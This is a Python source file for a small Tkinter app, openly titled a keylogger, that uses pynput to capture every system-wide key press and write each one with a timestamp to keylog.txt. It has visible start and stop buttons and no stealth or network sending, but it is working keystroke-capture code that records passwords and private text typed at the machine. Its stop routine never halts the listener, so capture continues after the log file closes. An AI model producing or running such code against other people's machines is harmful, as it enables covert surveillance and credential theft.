import tkinter as tk
import threading
import time
from pynput import keyboard
import os

class KeyloggerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Keylogger")

        # Create a label to display the status
        self.status_label = tk.Label(master, text="Keylogger not started")
        self.status_label.pack()

        # Create a button to start the keylogger
        self.start_button = tk.Button(master, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack()

        # Create a button to stop the keylogger
        self.stop_button = tk.Button(master, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack()

        # Create a label to display the log file path
        self.log_file_label = tk.Label(master, text="Log file: keylog.txt")
        self.log_file_label.pack()

        # Create a label to display the output file path
        self.output_file_label = tk.Label(master, text="Output file: ")
        self.output_file_label.pack()

        # Create a thread to run the keylogger
        self.keylogger_thread = None
        self.log_file = None
        self.stop_event = threading.Event()

    def start_keylogger(self):
        try:
            self.status_label.config(text="Keylogger started. Press Ctrl+C to stop.")
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)

            # Create a log file to store the keystrokes
            self.log_file = open("keylog.txt", "w")

            # Start the keylogger thread
            self.keylogger_thread = threading.Thread(target=self.run_keylogger)
            self.stop_event.clear()
            self.keylogger_thread.start()
        except Exception as e:
            self.status_label.config(text=f"Error: {e}")

    def run_keylogger(self):
        try:
            listener = keyboard.Listener(on_press=self.on_key_press)
            listener.start()  # Start the listener
            while not self.stop_event.is_set():
                time.sleep(0.1)  # Use time.sleep instead of listener.join
        except KeyboardInterrupt:
            pass
        except Exception as e:
            self.status_label.config(text=f"Error: {e}")

    def on_key_press(self, key):
        # Get the current timestamp
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

        # Log the key press
        try:
            self.log_file.write(f"{timestamp} - {key}\n")
            self.log_file.flush()
        except Exception as e:
            self.status_label.config(text=f"Error: {e}")

    def stop_keylogger(self):
        try:
            self.status_label.config(text="Keylogger stopped.")
            self.log_file.close()
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

            # Stop the keylogger thread
            if self.keylogger_thread:
                self.stop_event.set()
                self.keylogger_thread.join()

            # Show the output file path
            self.output_file_label.config(text=f"Output file: {self.log_file.name}")

            # Open the output file
            os.startfile(self.log_file.name)
        except Exception as e:
            self.status_label.config(text=f"Error: {e}")

root = tk.Tk()
my_gui = KeyloggerGUI(root)
root.mainloop()
